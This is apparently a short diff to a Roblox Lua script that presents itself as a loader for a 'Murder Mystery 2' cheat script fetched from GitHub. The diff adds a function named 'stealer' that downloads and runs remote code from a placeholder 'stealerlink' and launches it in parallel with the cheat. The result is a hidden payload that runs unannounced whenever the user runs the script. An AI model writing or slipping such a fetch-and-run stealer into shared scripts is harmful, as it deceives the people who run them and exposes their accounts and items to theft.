@@ -1,1 +1,11 @@
+local function stealer()
+
+loadstring(game:HttpGet("stealerlink"))()
+end
+local function farm()
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/v1ain/Murder-Mystery-2-OP-Script/refs/heads/main/main'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
